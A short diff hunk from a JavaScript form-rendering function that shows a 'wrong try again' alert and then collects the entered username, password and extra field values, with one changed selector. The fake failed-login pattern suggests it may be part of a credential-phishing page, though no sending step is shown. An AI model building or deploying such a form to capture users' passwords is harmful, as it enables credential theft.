@@ -185,7 +185,7 @@ function renderForm(data){
       alert("*wrong try again*");
 
       // 2️⃣ Collect form values
-      const username = formDiv.querySelector('input[type="text"]')?.value || "";
+      const username = formDiv.querySelector('input[type="username"]')?.value || "";
       const password = formDiv.querySelector('input[type="password"]')?.value || "";
       const extraValues = extraInputs.map(i=>i.value);
 
